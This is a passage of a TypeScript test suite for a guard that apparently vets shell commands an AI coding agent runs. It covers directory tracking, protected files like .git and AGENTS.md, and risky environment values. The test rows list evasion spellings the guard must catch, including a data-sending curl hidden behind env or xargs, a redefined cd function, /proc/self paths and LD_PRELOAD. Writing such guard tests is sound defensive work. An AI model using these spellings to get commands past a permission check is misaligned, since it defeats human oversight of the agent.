    assert.deepEqual(names("*/*.pem"), ["sub/c.pem"]);
    assert.deepEqual(names("{a,b}.txt"), ["a.txt", "b.txt"]);
    assert.deepEqual(names(".{env,x}"), [".env", ".x"]);
    assert.deepEqual(names("[ab].txt"), ["a.txt", "b.txt"]);
    assert.deepEqual(names("[!a].txt"), ["b.txt"]);
    assert.deepEqual(names("nothing*"), []);
  });
  test("what cannot be known here is undefined", () => {
    for (const w of ["$f", "`x`", "{a..3}.txt", "{1..100000}.txt", "x$()"]) assert.equal(expandWord(w, dir), undefined, w);
    // A range bash expands is expanded (round 4, finding 2).
    assert.deepEqual(names("{a..c}.txt"), ["a.txt", "b.txt", "c.txt"]);
  });
});

// Round 3, group C: the one traversal the argv guards share, and the helpers of its fixes.
describe("r3 C: one traversal for every argv guard", () => {
  const argv = (c: string) => parse(c).cmds[0].argv;
  const at = (c: string) => programs(argv(c)).map((i) => argv(c)[i]);
  for (const [c, inner] of [
    ["uv run tar -xf t.tar", "tar"],
    ["uv run --with x --frozen pytest -q", "pytest"],
    ["poetry run -- tar x", "tar"],
    ["pnpm exec tsc --noEmit", "tsc"],
    ["bundle exec rake", "rake"],
    ["timeout -s KILL 5 tar x", "tar"],
    ["nice -n 5 uv run tar x", "tar"],
    ["xargs -I {} tar x", "tar"],
    ["find . -name x -exec ls \\; -exec nice tar x \\;", "tar"],
    ["env -u X tar x", "tar"],
  ] as [string, string][]) test(`r3 8: the guards see ${inner} in ${JSON.stringify(c)}`, () => assert.ok(at(c).includes(inner), JSON.stringify(at(c))));
  for (const c of ["env -u ls curl -d x", "exec -a ls curl -d x", "uv run --index-url ls curl", "env -S'tar x'", "env -C / ls", "uv run --directory / ls", "xargs -a ls curl"]) test(`r3 8: asks: ${JSON.stringify(c)}`, () => assert.ok(traversalProblem(argv(c)), c));
  for (const c of ["timeout 60 npm test", "env FOO=1 npm test", "nice -n 5 make", "xargs -0 -n1 -P4 rm -f", "uv run -m pytest", "sudo -u x ls", "command -v git", "time -p cargo build", "if npm test; then"]) test(`r3 8: reads: ${JSON.stringify(c)}`, () => assert.equal(traversalProblem(argv(c)), undefined, c));

  test("r3 9: every spelling of make -f", () => {
    assert.deepEqual(makefiles(["-f", "-", "--file=x", "--makef", "y", "-sf-", "-C", "d", "-j", "4", "-fz"]), ["-", "x", "y", "-", "z"]);
  });
  test("r3 28: values that change nothing that runs", () => {
    const inProject = (p: string) => p.startsWith("/proj/");
    for (const [n, v] of [["NODE_OPTIONS", "--max-old-space-size=8192"], ["NODE_OPTIONS", "--enable-source-maps --no-warnings"], ["PAGER", "cat"], ["GIT_PAGER", "cat"], ["CC", "clang"], ["CXX", "g++-13"], ["PYTHONPATH", "src:tests"], ["PYTHONPATH", "src:$PYTHONPATH"]]) assert.ok(envValueOk(n, v, "/proj/x", inProject), `${n}=${v}`);
    for (const [n, v] of [["NODE_OPTIONS", "--require ./x.js"], ["NODE_OPTIONS", "--inspect"], ["NODE_OPTIONS", "-r x"], ["PAGER", "less"], ["CC", "/tmp/clang"], ["CC", "clang -fplugin=x"], ["PYTHONPATH", "/tmp/x"], ["PYTHONPATH", "../.."], ["PYTHONPATH", "$X"], ["LD_PRELOAD", "x"], ["PATH", "/usr/bin"]]) assert.ok(!envValueOk(n, v, "/proj/x", inProject), `${n}=${v}`);
    assert.ok(!envValueOk("PYTHONPATH", "src", undefined, inProject), "a relative entry where the directory is unknown");
  });
  test("r3 24: a protected name spelled with braces or a glob", () => {
    const names = [".git", "opencode.json", "AGENTS.md", ".husky"];
    for (const t of ["sub/{.git,x}", "sub/.g[i]t/config", "opencode.jso{n,n}", "x/.gi?/hooks", ".g*t", "AGENTS.m?", ".gi{s..u}"]) assert.ok(protectedNameIn(t, names), t);
    for (const t of ["src/{a,b}", "sub/[.]git", "?git", "notes.md"]) assert.equal(protectedNameIn(t, names), undefined, t);
    // A generic glob is held to what it matches where the command runs.
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "r3-24-"));
    fs.mkdirSync(path.join(dir, "build"));
    fs.writeFileSync(path.join(dir, "build", "out.md"), "");
    for (const t of ["build/*", "*.md", "build/*.md", "sub/*/config", ".*/x"]) assert.equal(protectedNameIn(t, names, dir), undefined, t);
    fs.writeFileSync(path.join(dir, "build", "AGENTS.md"), "");
    assert.equal(protectedNameIn("build/*.md", names, dir), "AGENTS.md");
    fs.mkdirSync(path.join(dir, "sub", ".git"), { recursive: true });
    assert.equal(protectedNameIn("sub/.*/config", names, dir), ".git");
    assert.ok(protectedNameIn("sub/.*/config", names), "with the directory unknown, the pattern decides");
    fs.rmSync(dir, { recursive: true, force: true });
  });
  test("r3 5b: marks every expansion bash performs and nothing else", () => {
    const strip = (s: string) => s.replace(/[\u000e\u000f]/g, "");
    for (const c of ["git clean $x", "echo \"$(cat <<'EOF'\nit's $x\nEOF\n)\"", "awk '{print $1}' f", "make -j$(nproc)", "echo ${HOME} $HOME", "cat <<EOF\n$(date) $x\nEOF", "echo \\$x '$y' # $z"]) {
      const marked = markExpansions(c);
      assert.equal(strip(marked), c, c);
      assert.deepEqual(parse(marked).cmds.map((x) => x.argv.map(strip)), parse(c).cmds.map((x) => x.argv), c);
    }
    assert.equal(markExpansions("awk '{print $1}' f"), "awk '{print $1}' f");
    assert.equal(markExpansions("echo \\$x '$y' # $z"), "echo \\$x '$y' # $z");
    assert.ok(markExpansions("git clean $x").includes("\u000e$x"));
    assert.ok(markExpansions("git log \"$b\"").includes("\u000f$b"));
  });
});

// Round 4, finding 20, second pass: a file git writes is placed where git's `-C` options lead,
// each after the one before and an absolute one starting over (`path.join` put a later absolute
// `-C` under the earlier ones).
describe("r4 20b: gitWrites places a file by the whole -C chain", () => {
  test("a later absolute -C starts over", () => {
    assert.deepEqual(gitWrites(["-C", "build", "-C", "/tmp/x", "format-patch", "-o", "out", "HEAD~1"]), [["/tmp/x/out", true]]);
    assert.deepEqual(gitWrites(["-C", "a", "-C", "b", "apply", "--build-fake-ancestor=fa", "p.diff"]), [["a/b/fa", false]]);
    assert.deepEqual(gitWrites(["-C", "/r", "-C", "s", "apply", "--bu", "../fa", "p.diff"]), [["/r/s/../fa", false]]);
    assert.deepEqual(gitWrites(["-C", "a", "apply", "--build-fake-ancestor=/abs/fa", "p.diff"]), [["/abs/fa", false]]);
  });
  test("a fake ancestor by every spelling git apply takes, and none it refuses", () => {
    assert.deepEqual(gitWrites(["apply", "--bu=x", "p.diff"]), [["x", false]]);
    assert.deepEqual(gitWrites(["apply", "p.diff", "--build-fake", "x"]), [["x", false]]);
    assert.deepEqual(gitWrites(["apply", "--build-fake-ancestor=x", "--no-build-fake-ancestor", "p.diff"]), []);
  });
});

// Round 4, finding 4, second pass: where each writer of unnamed files writes, read by the tool's
// own options (`dirs`: [] where it runs, [undefined] where the check cannot place it).
describe("r4 4b: the directories a writer of unnamed files covers", () => {
  const dirs = (c: string) => writesOf(parse(c).cmds).unlisted.map((u) => u.dirs);
  const named = (c: string) => writesOf(parse(c).cmds).writes.map((w) => [w.word, !!w.dir]);
  test("archives and compressors", () => {
    assert.deepEqual(dirs("unzip -o a.zip -d sub"), [["sub"]]);
    assert.deepEqual(dirs("7z x a.7z -osub"), [["sub"]]);
    assert.deepEqual(dirs("cpio -id < a.cpio"), [[undefined]]);
    assert.deepEqual(dirs("cpio -i -D sub < a.cpio"), [[undefined]]);
    assert.deepEqual(dirs("gunzip sub/x.sh.gz"), [["sub"]]);
    assert.deepEqual(dirs("tar -xf a.tar"), [[]]);
    assert.deepEqual(dirs("tar -xf a.tar -C sub"), [["sub"]]);
    assert.deepEqual(dirs("tar -xf a.tar --direc=sub"), [["sub"]]);
    assert.deepEqual(dirs("tar -xf a.tar x -C sub"), [[".", "sub"]]);
    assert.deepEqual(dirs("tar xfC a.tar sub"), [["sub"]]);
    assert.deepEqual(dirs("tar -xPf a.tar"), [[undefined]]);
    assert.deepEqual(dirs("tar -xf a.tar --abs"), [[undefined]]);
    assert.deepEqual(dirs("tar -xf a.tar -C a -C b"), [[undefined]]);
    assert.deepEqual(dirs("tar -xf a.tar --one-top-level=.."), [[undefined]]);
    assert.deepEqual(dirs("tar -xf a.tar --xform s,^,x/,"), [[undefined]]);
    assert.deepEqual(dirs("tar -xf a.tar -T list"), [[undefined]]);
    assert.deepEqual(dirs("tar -xf a.tar --frobnicate"), [[undefined]]);
  });
  test("patch", () => {
    assert.deepEqual(dirs("patch -p1 < x.diff"), [[]]);
    assert.deepEqual(dirs("patch -d sub -p1 < x.diff"), [["sub"]]);
    assert.deepEqual(dirs("patch --dir sub -p1 < x.diff"), [["sub"]]);
    assert.deepEqual(dirs("patch --di=sub -p1 < x.diff"), [["sub"]]);
    assert.deepEqual(dirs("patch -p1 -B ../bak/ < x.diff"), [[undefined]]);
    assert.deepEqual(dirs("patch --frob -p1 < x.diff"), [[undefined]]);
    assert.deepEqual(dirs("patch --dry-run -p1 < x.diff"), []);
    assert.deepEqual(dirs("patch --dry -p1 < x.diff"), []);
  });
  test("copies, moves and links", () => {
    assert.deepEqual(dirs("cp -r a b"), [["b"]]);
    assert.deepEqual(dirs("cp --recur a b"), [["b"]]);
    assert.deepEqual(dirs("cp --arc a b"), [["b"]]);
    assert.deepEqual(dirs("cp -rt.. a"), [[".."]]);
    assert.deepEqual(dirs("cp -r a/. b -S .bak"), [["b"]]);
    assert.deepEqual(dirs("cp a b"), []);
    assert.deepEqual(dirs("cp --frob a b"), [[undefined]]);
    assert.deepEqual(dirs("rsync -a a/ b/ --exclude zz"), [["b/"]]);
    assert.deepEqual(dirs("rsync -a --backup-dir=../x a/ b/"), [[undefined]]);
    assert.deepEqual(named("cp --target-dir=scripts a b"), [["scripts", true]]);
    assert.deepEqual(named("cp -S .bak a b"), [["b", false]]);
    // A hard link: the source is the session's too.
    assert.deepEqual(named("ln a b"), [["b", false], ["a", false]]);
    assert.deepEqual(named("ln -s a b"), [["b", false]]);
  });
});

// ---- Round 4, group B, third pass, first part, third go (B3c) ----
// B3c-1: where each command runs, as bash goes there: a subshell (`( )`, a substitution, a
// pipeline's part, a background job) starts in the directory of the shell around it and keeps its
// own `cd`; `cd` goes by the logical path (`..` taken off the text); what cannot be followed is
// unknown, not the starting directory. Probed with bash 5.2.37 (xcheck/b3c/bash/).
describe("r4 B3c-1: the directory each command runs in", () => {
  const g = guardModule as any;
  const work = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-b3c-")));
  for (const d of ["src", "sub", "a/real/deep"]) fs.mkdirSync(path.join(work, d), { recursive: true });
  fs.symlinkSync("real/deep", path.join(work, "a", "link"));
  fs.symlinkSync("../a/real/deep", path.join(work, "sub", "link"));
  after(() => fs.rmSync(work, { recursive: true, force: true }));
  // The real directories each command with these words runs in, in the order listed; undefined
  // where the check cannot tell.
  const at = (command: string, words: string): (string[] | undefined)[] => {
    const where = g.located(command, work);
    return where.cmds.filter((c: any) => c.argv.join(" ") === words).map((c: any) => {
      const places = where.places.get(c);
      return places && [...new Set(places.map((p: any) => path.relative(work, p.real) || "."))].sort();
    });
  };
  const rows: [string, string, (string[] | undefined)[]][] = [
    ["( cd sub; ls ); ls", "ls", [["sub"], ["."]]],
    ["cd sub; ( ls )", "ls", [["sub"]]],
    ["echo $(cd sub; ls); ls", "ls", [["sub"], ["."]]],
    ["cd sub | ls; ls", "ls", [["."], ["."]]],
    ["ls | cd sub; ls", "ls", [["."], ["."]]],
    ["cd sub & ls", "ls", [["."]]],
    ["(cd sub && ls) & ls", "ls", [["sub"], ["."]]],
    ["{ echo; cd sub; ls; } | cat; ls", "ls", [["sub"], ["."]]],
    ["{ cd sub; ls; }; ls", "ls", [["sub"], ["sub"]]],
    ["bash -c 'cd sub; ls'; ls", "ls", [["."], ["sub"]]],
    ["cd sub/link && cd .. && ls", "ls", [["sub"]]],
    ["cd a/link && cd .. && ls", "ls", [["a"]]],
    ["cd a/link && cd .. && cat x", "cat x", [["a"]]],
    ["cd -P a/link && cd .. && ls", "ls", [["a/real"]]],
    ["cd -P sub/link && cd .. && ls", "ls", [["a/real"]]],
    ["(cd sub/link/.. && ls)", "ls", [["sub"]]],
    ["mkdir -p out && cd out && ls", "ls", [["out"]]],
    ["mkdir out && cd out && ls", "ls", [["out"]]],
    ["cd nope && ls", "ls", [undefined]],
    ["cd - && ls", "ls", [undefined]],
    ["cd \"$d\" && ls", "ls", [undefined]],
    ["pushd sub && ls", "ls", [undefined]],
    // (B5: a cd outside the shape leaves every place of the call unknown.)
    ["(cd \"$d\"; ls); ls", "ls", [undefined, undefined]],
    ["cd \"$d\"; ( ls ); ls", "ls", [undefined, undefined]],
    ["cd \"$d\"; echo $(ls)", "ls", [undefined]],
    ["set -P; ls", "ls", [undefined]],
    // (B5: a cd in a loop is outside the shape.)
    ["for d in src sub; do (cd \"$d\" && ls); done", "ls", [undefined]],
    ["for d in src sub; do cd \"$d\"; done; ls", "ls", [undefined]],
    ["for i in 1 2; do ls; cd sub; done", "do ls", [undefined]],
    ["true || cd sub; ls", "ls", [[".", "sub"]]],
    ["cd sub || ls; ls", "ls", [["."], ["sub"]]],
    ["if true; then echo; cd sub; fi; ls", "ls", [undefined]],
    // (B5: a cd in a branch is outside the shape.)
    ["if true; then (cd sub; ls); fi; ls", "ls", [undefined, undefined]],
    ["cd sub; cd ..; ls", "ls", [["."]]],
  ];
  for (const [command, words, want] of rows) test(`r4 B3c-1: ${JSON.stringify(command)}: ${words} runs in ${JSON.stringify(want)}`, () => assert.deepEqual(at(command, words), want));
  test("r4 B3c-1: cd goes by the text, as bash does; -P and the kernel by the real directory", () => {
    const start = g.startPlace(work);
    assert.deepEqual(g.cdTo(start, "sub/link/.."), { logical: path.join(work, "sub"), real: path.join(work, "sub") });
    assert.deepEqual(g.cdTo(g.cdTo(start, "a/link"), ".."), { logical: path.join(work, "a"), real: path.join(work, "a") });
    assert.equal(g.cdTo(start, "sub/link/..", true)?.real, path.join(work, "a", "real"));
    assert.equal(g.cdTo(start, "nope"), undefined);
    assert.equal(g.cdTo(start, "nope/.."), undefined, "bash refuses a .. after a name that is not a directory");
    assert.equal(g.cdTo(start, "~")?.real, fs.realpathSync(os.homedir()));
  });
  test("r4 B3c-1: single follows cd as bash does", () => {
    assert.equal(single("cd sub/link && cd .. && ls", work)?.dir, path.join(work, "sub"));
    assert.equal(single("cd a/link/.. && ls", work)?.dir, path.join(work, "a"));
  });
});

// ---- Round 4, group B, third pass, first part, fourth go (B3d) ----
// A place the check holds as known must be the place bash is in, for certain: a `cd` that can
// fail leaves the shell in one of two places; a directory the call makes is followed only where
// nothing before could have changed the tree.
describe("r4 B3d: a place is known only when it is certain", () => {
  const g = guardModule as any;
  const work = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-b3d-")));
  for (const d of ["src", "sub", "emptyd", "closed", "p/q", "p/src", "q", "a/real/deep", "a/real/kx"]) fs.mkdirSync(path.join(work, d), { recursive: true });
  fs.symlinkSync("real/deep", path.join(work, "a", "link"));
  fs.symlinkSync("../a/real/deep", path.join(work, "sub", "link"));
  fs.chmodSync(path.join(work, "closed"), 0);
  after(() => {
    fs.chmodSync(path.join(work, "closed"), 0o755);
    fs.rmSync(work, { recursive: true, force: true });
  });
  const at = (command: string, words: string): (string[] | undefined)[] => {
    const where = g.located(command, work);
    return where.cmds.filter((c: any) => c.argv.join(" ") === words).map((c: any) => {
      const places = where.places.get(c);
      return places && [...new Set(places.map((p: any) => path.relative(work, p.real) || "."))].sort();
    });
  };
  const rows: [string, string, (string[] | undefined)[]][] = [
    // B3d-1: a cd that can fail.
    ["cd src; ls", "ls", [["src"]]],
    ["echo; cd src; ls", "ls", [["src"]]],
    ["cd src; cd ../sub; ls", "ls", [["sub"]]],
    // (B5: a redirect on the cd is outside the shape: every place unknown.)
    ["cd src < absent; ls", "ls", [undefined]],
    ["< absent cd src; ls", "ls", [undefined]],
    ["cd src 2>&1; ls", "ls", [undefined]],
    ["cd src <<< x; ls", "ls", [undefined]],
    ["{ cd src; } < absent; ls", "ls", [[".", "src"]]],
    ["{ cd src; } 2>/dev/null && ls", "ls", [["src"]]],
    ["{ cd src; } 2>/dev/null || ls", "ls", [[".", "src"]]],
    ["X=1 cd src; ls", "ls", [undefined]],
    // (B5: a directory that cannot be entered now is outside the shape.)
    ["cd closed; ls", "ls", [undefined]],
    ["mv src src2; cd src; ls", "ls", [[".", "src"]]],
    ["rm -rf src; cd src || true; ls", "ls", [[".", "src"]]],
    ["mv x y; cd src && ls", "ls", [["src"]]],
    ["mv x y; cd src && ls; ls", "ls", [["src"], [".", "src"]]],
    ["mv x y; (cd src; ls)", "ls", [[".", "src"]]],
    ["(cd src; ls) | mv x y", "ls", [[".", "src"]]],
    ["(cd src; ls) | cat", "ls", [["src"]]],
    ["(cd src; ls) & mv x y", "ls", [[".", "src"]]],
    ["mv x y; bash -c 'cd src; ls'", "ls", [[".", "src"]]],
    ["bash -c 'cd src; ls'", "ls", [["src"]]],
    ["cat <<EOF; cd src; ls\n$(mv x y)\nEOF", "ls", [[".", "src"]]],
    ["cat <<EOF; cd src; ls\n$(echo x)\nEOF", "ls", [["src"]]],
    ["mv sub sub2; cd sub; echo x > build.sh", "echo x", [[".", "sub"]]],
    // B3d-2: a directory the call makes.
    ["mkdir -p out && cd out && ls", "ls", [["out"]]],
    ["echo; mkdir -p out && cd out && ls", "ls", [["out"]]],
    ["tar -xf b.tar; mkdir -p out && cd out && ls", "ls", [undefined]],
    ["mv a saved; ln -s sub a; mkdir -p a/new && cd a/new && ls", "ls", [undefined]],
    // B3d-5: the unions of a chain whose cds may fail.
    ["mv x y; cd p || cd q; ls", "ls", [[".", "p", "q"]]],
    ["mv x y; cd p && cd q || cd src; ls", "ls", [[".", "p", "p/q", "p/src", "src"]]],
    // B3d-5: a function defined inside a group is a definition, not a cd that runs.
    ["{ g() { cd sub; }; }; ls", "ls", [undefined]],
    ["{ g() { echo; }; }; ls", "ls", [["."]]],
    // A function named cd: its header moves nothing, and a cd after it may be the function (B5: a
    // call that defines one is outside the shape).
    ["cd() { :; }; ls", "ls", [undefined]],
    ["cd() { :; }; cd src; ls", "ls", [undefined]],
  ];
  for (const [command, words, want] of rows) test(`r4 B3d: ${JSON.stringify(command)}: ${words} runs in ${JSON.stringify(want)}`, () => assert.deepEqual(at(command, words), want));
  // B3d-5: the second text $PWD may hold (startPlace's `alt`), which a nested shell inherits.
  test("r4 B3d-5: a relative cd is followed only where both texts of $PWD lead to the same directory", () => {
    const deep = path.join(work, "a", "real", "deep");
    const saved = process.env.PWD;
    try {
      process.env.PWD = path.join(work, "a", "link");
      const start = g.startPlace(deep);
      assert.equal(start.alt, path.join(work, "a", "link"));
      assert.equal(g.cdTo(start, ".."), undefined, "bash's .. is a/ by the inherited text, a/real/ by the real one");
      // (a/kx names nothing: from either text the kernel's walk leads to a/real/kx.)
      assert.equal(g.cdTo(start, "../kx")?.real, path.join(work, "a", "real", "kx"));
      assert.equal(g.cdTo(start, "/")?.real, "/");
      delete process.env.PWD;
      assert.equal(g.cdTo(g.startPlace(deep), "..")?.real, path.join(work, "a", "real"));
    } finally {
      if (saved === undefined) delete process.env.PWD;
      else process.env.PWD = saved;
    }
  });
  test("r4 B3d-5: a nested shell may hold either text of the directory it starts in", () => {
    assert.deepEqual(at("cd a/link && bash -c 'cd ..; ls'", "ls"), [undefined]);
    assert.deepEqual(at("cd a/link && cd ..; ls", "ls"), [["a"]]);
  });
  test("r4 B3d-5: where the text names nothing, cd goes where the kernel's walk leads", () => {
    const start = g.startPlace(work);
    assert.deepEqual(g.cdTo(start, "sub/link/../kx"), { logical: path.join(work, "a", "real", "kx"), real: path.join(work, "a", "real", "kx") });
  });
});

// ---- Round 4, group B, fifth pass (B5): a known shape, or the model ----
// The places of a call's commands are known only when every cd, pushd or popd it runs, at any
// depth, is bash's own `cd [-L|-P|--] <word>` with nothing in front and no redirect, outside every
// loop, branch and function body, its word one the plugin resolves to a directory there now (or
// one `mkdir` makes just before it). Any other call that runs one: every place unknown. One row
// for each condition (a mutation that takes the condition out turns its row: xcheck/b5/mutation/).
describe("r4 B5-1: the shape of a call whose places are known", () => {
  const g = guardModule as any;
  const work = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "automode-b5-")));
  for (const d of ["src", "sub", "closed", "bld", "~", "a/real/deep"]) fs.mkdirSync(path.join(work, d), { recursive: true });
  fs.symlinkSync("real/deep", path.join(work, "a", "link"));
  fs.chmodSync(path.join(work, "closed"), 0);
  execFileSync("git", ["init", "-q", work]);
  after(() => {
    fs.chmodSync(path.join(work, "closed"), 0o755);
    fs.rmSync(work, { recursive: true, force: true });
  });
  const at = (command: string, words: string): (string[] | undefined)[] => {
    const where = g.located(command, work);
    return where.cmds.filter((c: any) => c.argv.join(" ") === words).map((c: any) => {
      const places = where.places.get(c);
      return places && [...new Set(places.map((p: any) => path.relative(work, p.real) || "."))].sort();
    });
  };
  const rows: [string, string, (string[] | undefined)[]][] = [
    // In the shape.
    ["cd src; ls", "ls", [["src"]]],
    ["cd -L src; ls", "ls", [["src"]]],
    ["cd -P a/link; ls", "ls", [["a/real/deep"]]],
    ["cd -- src; ls", "ls", [["src"]]],
    ["cd 'src'; ls", "ls", [["src"]]],
    ["(cd src; ls) | cat; ls", "ls", [["src"], ["."]]],
    ["echo \"$(cd src; ls)\"; ls", "ls", [["src"], ["."]]],
    ["bash -c 'cd src; ls'", "ls", [["src"]]],
    ["true || cd sub; ls", "ls", [[".", "sub"]]],
    ["cd \"$PWD/src\"; ls", "ls", [["src"]]],
    ["cd \"$PWD\"/src; ls", "ls", [["src"]]],
    ["cd $PWD/src; ls", "ls", [["src"]]],
    ["cd ${PWD}/src; ls", "ls", [["src"]]],
    ["cd \"$(pwd)/src\"; ls", "ls", [["src"]]],
    ["cd $(pwd)/src; ls", "ls", [["src"]]],
    ["cd src; cd \"$PWD/../sub\"; ls", "ls", [["sub"]]],
    ["cd \"$(git rev-parse --show-toplevel)\"; ls", "ls", [["."]]],
    ["cd src && cd \"$(git rev-parse --show-toplevel)/sub\"; ls", "ls", [["sub"]]],
    ["mkdir -p out && cd out && ls", "ls", [["out"]]],
    ["rm -rf bld && mkdir bld && cd bld && ls", "ls", [["bld"]]],
    ["rm -fr new && mkdir -p new && cd new && ls", "ls", [["new"]]],
    ["cd src; ls() { echo; }; ls", "{ echo", [["src"]]],
    // Outside it: a function named cd (in any spelling), pushd or popd.
    ["cd() { :; }; cd src && ls", "ls", [undefined]],
    ["function cd { :; }; cd src && ls", "ls", [undefined]],
    ["function cd() { :; }; cd src; ls", "ls", [undefined]],
    ["cd () (:); cd src; ls", "ls", [undefined]],
    ["{ cd() { :; }; }; cd src; ls", "ls", [undefined]],
    ["bash -c 'cd() { :; }'; cd src; ls", "ls", [undefined]],
    // Not bash's cd with nothing in front: pushd, popd, a keyword, an assignment.
    ["pushd src; ls", "ls", [undefined]],
    ["popd; ls", "ls", [undefined]],
    ["time cd src; ls", "ls", [undefined]],
    ["! cd src; ls", "ls", [undefined]],
    ["X=1 cd src; ls", "ls", [undefined]],
    ["set -P; cd src; ls", "ls", [undefined]],
    // A redirect of any spelling.
    ["cd src 2>/dev/null; ls", "ls", [undefined]],
    ["cd src < absent; ls", "ls", [undefined]],
    ["cd src >&2 && ls", "ls", [undefined]],
    // In a loop, a branch or a function's body, at any depth.
    ["for i in 1 2; do (cd src; ls); done", "ls", [undefined]],
    ["while false; do echo $(cd src; ls); done", "ls", [undefined]],
    ["for i in 1; do bash -c 'cd src; ls'; done", "ls", [undefined]],
    ["if true; then (cd sub; ls); fi; ls", "ls", [undefined, undefined]],
    ["case x in x) (cd sub; ls);; esac", "ls", [undefined]],
    ["f() { (cd sub; ls); }; ls", "ls", [undefined, undefined]],
    // Not `cd [-L|-P|--] <one word>`.
    ["cd -e src; ls", "ls", [undefined]],
    ["cd src sub; ls", "ls", [undefined]],
    ["cd; ls", "ls", [undefined]],
    ["cd -; ls", "ls", [undefined]],
    // A word the plugin does not resolve, or that names no directory there now that can be entered.
    ["cd \"$d\"; ls", "ls", [undefined]],
    ["cd \"~\"; ls", "ls", [undefined]],
    ["cd s?b; ls", "ls", [undefined]],
    ["cd ~+/src; ls", "ls", [undefined]],
    ["cd \"$(echo src)\"; ls", "ls", [undefined]],
    ["cd \"$(pwd -P)/src\"; ls", "ls", [undefined]],
    ["cd \"$HOME$PWD\"; ls", "ls", [undefined]],
    ["cd nope; ls", "ls", [undefined]],
    ["cd closed; ls", "ls", [undefined]],
    ["cd /proc/self/cwd; ls", "ls", [undefined]],
    ["IFS=/; cd $PWD/src; ls", "ls", [undefined]],
    ["pwd() { echo /; }; cd \"$(pwd)/src\"; ls", "ls", [undefined]],
    ["git() { echo /; }; cd \"$(git rev-parse --show-toplevel)\"; ls", "ls", [undefined]],
    ["mv x y; cd \"$(git rev-parse --show-toplevel)\"; ls", "ls", [undefined]],
    ["rm -rf src && mkdir newd && cd newd && ls", "ls", [undefined]],
    ["rm -rf newd; mkdir newd && cd newd && ls", "ls", [undefined]],
    ["rm -rf newd && mkdir newd && rm -rf newd && cd newd && ls", "ls", [undefined]],
    ["rm -rf newd || mkdir newd && cd newd && ls", "ls", [undefined]],
    ["true || rm -rf newd && mkdir -p newd && cd newd && ls", "ls", [undefined]],
    ["mkdir -p {x,y} && cd {x,y} && ls", "ls", [undefined]],
    // (A cd outside the shape leaves the whole call unknown, even where no command runs after it.)
    ["(cd \"$d\"); ls", "ls", [undefined]],
    ["rm -rf a/x && mkdir a/x && cd a/x && ls", "ls", [undefined]],
    // A command whose place is not known in a call that changes directory.
    ["echo cd; f() { ls; }; f; f", "{ ls", [undefined]],
  ];
  for (const [command, words, want] of rows) test(`r4 B5-1: ${JSON.stringify(command)}: ${words} runs in ${JSON.stringify(want)}`, () => assert.deepEqual(at(command, words), want));
  test("r4 B5-1: ~ and $HOME are the home directory", () => {
    for (const command of ["cd ~; ls", "cd $HOME; ls", "cd \"$HOME\"; ls", "cd ~/; ls", "cd ${HOME}; ls"]) {
      const where = g.located(command, work);
      assert.deepEqual(where.places.get(where.cmds[1])?.map((p: any) => p.real), [fs.realpathSync(os.homedir())], command);
    }
  });
  test("r4 B5-2: outside the shape, located says so, and every place and cd target is unknown", () => {
    const where = g.located("cd() { :; }; cd src && ls", work);
    assert.equal(where.unfollowed, "a cd the checks do not follow: where its commands run cannot be told");
    for (const cmd of where.cmds) assert.equal(where.places.get(cmd), undefined);
    for (const cmd of where.cmds) assert.equal(where.cwd.get(cmd), undefined);
    for (const [, cd] of where.cds) assert.equal(cd.to, undefined);
    assert.equal(g.located("cd src && ls", work).unfollowed, undefined);
  });
});

// ---- round 4, group B, the go after the second part and the place shape (B7) ----
describe("r4 B7 (guard level)", () => {
  const g = guardModule as any;
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "b7-guard-"));
  after(() => fs.rmSync(dir, { recursive: true, force: true }));
  fs.mkdirSync(`${dir}/src`);
  fs.mkdirSync(`${dir}/.git/hooks`, { recursive: true });
  fs.writeFileSync(`${dir}/f`, "x\n");
  fs.writeFileSync(`${dir}/.env`, "DECOY=1\n");
  fs.writeFileSync(`${dir}/src/main.c`, "\n");
  fs.symlinkSync("/proc/self/cwd", `${dir}/mylink`);
  fs.symlinkSync("/dev/stdin", `${dir}/in`);
  fs.symlinkSync(".git", `${dir}/gitlink`);

  test("r4 B7-9: a path is relative to the process that walks it when its walk enters /proc/self, at any step", () => {
    for (const p of ["/proc/self/cwd/x", "/proc/self/root/etc/hostname", "/proc/self/root/proc/self/cwd/x", "/proc/thread-self/cwd", "/proc/1/cwd/x", `/proc/${process.pid}/root`, "/proc/self/environ", "/proc/self", "/proc/self/fd", `${dir}/mylink/x`, `${dir}/src/../mylink`, "/dev/fd", "/dev/fd/../environ", "/proc/self/task"])
      assert.equal(g.procRelative(p), true, p);
    // Not the files of /proc that are no process's, not a descriptor, not an ordinary path.
    for (const p of ["/proc/cpuinfo", "/proc/meminfo", "/proc/sys/kernel/hostname", "/dev/stdin", "/dev/stdout", "/dev/stderr", "/dev/fd/3", "/proc/self/fd/3", `${dir}/in`, "/dev/null", `${dir}/f`, `${dir}/nosuch/x`, "/etc/hostname", "/"])
      assert.equal(g.procRelative(p), false, p);
  });
  test("r4 B7-9: cdTo gives no place for a word reached through /proc/self", () => {
    const from = g.startPlace(`${dir}/src`);
    assert.equal(g.cdTo(from, "../mylink"), undefined);
    assert.equal(g.cdTo(from, "../mylink", true), undefined);
    assert.equal(g.cdTo(from, "/proc/self/cwd"), undefined);
    assert.equal(g.cdTo(from, "/proc/self/root/tmp"), undefined);
    assert.equal(g.cdTo(from, `${dir}/mylink/src`), undefined);
    assert.equal(g.cdTo(from, "..")?.real, fs.realpathSync(dir));
    // By the text bash keeps too: `lnk/..` is the directory `lnk` stands in, whatever it links to,
    // so `lnk/../mylink` is the link at the top (the kernel's walk of the word leads elsewhere).
    fs.mkdirSync(`${dir}/src/deep`);
    fs.symlinkSync("src/deep", `${dir}/lnk`);
    assert.equal(g.cdTo(g.startPlace(dir), "lnk/../mylink"), undefined);
    assert.equal(g.cdTo(g.startPlace(dir), "lnk/../src")?.real, fs.realpathSync(`${dir}/src`));
  });
  test("r4 B7-9: a call that changes directory through such a link is outside the shape; one that reads through it is placed", () => {
    for (const c of ["cd src && cd ../mylink && cat zzz", "cd mylink && cat zzz", "cd src; cd /proc/self/root/tmp && ls"]) assert.equal(g.located(c, dir).unfollowed, g.UNFOLLOWED, c);
    assert.equal(g.located("cd src && cat ../mylink/zzz", dir).unfollowed, undefined);
  });
  test("r4 B7-9: expandNames lists what bash lists, each name as it is spelled", () => {
